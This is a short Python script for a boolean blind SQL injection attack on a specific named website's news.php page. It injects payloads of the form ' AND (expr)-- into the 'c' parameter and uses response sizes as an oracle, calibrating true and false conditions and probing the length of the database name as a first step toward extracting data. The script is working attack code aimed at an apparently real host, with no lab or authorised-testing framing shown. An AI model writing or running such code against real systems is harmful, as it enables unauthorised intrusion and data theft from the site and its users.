#!/usr/bin/env python3
"""zagroup boolean blind SQLi - extract data via (select) subquery
Oracle: condition true -> larger response (4339+) vs false (~4331 or 4312)
"""
import urllib.request, urllib.parse, string, time

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception:
        return 0, 0

def cond_size(expr):
    """return response size for c=259' AND (expr)-- """
    payload = "%27%20AND%20(" + urllib.parse.quote(expr) + ")--%20"
    code, sz = fetch(BASE + "?c=259" + payload)
    return sz

# first: calibrate oracle - measure true vs false multiple times
print("=== calibrate ===")
for expr, tag in [("1=1", "true"), ("1=2", "false"),
                  ("(select 1)=1", "subq-true"), ("(select 1)=2", "subq-false"),
                  ("length(database())=5", "len=5"), ("length(database())=6", "len=6")]:
    sizes = [cond_size(expr) for _ in range(3)]
    print("  %-22s sizes=%s avg=%d" % (tag, sizes, sum(sizes)//3))
    time.sleep(0.3)
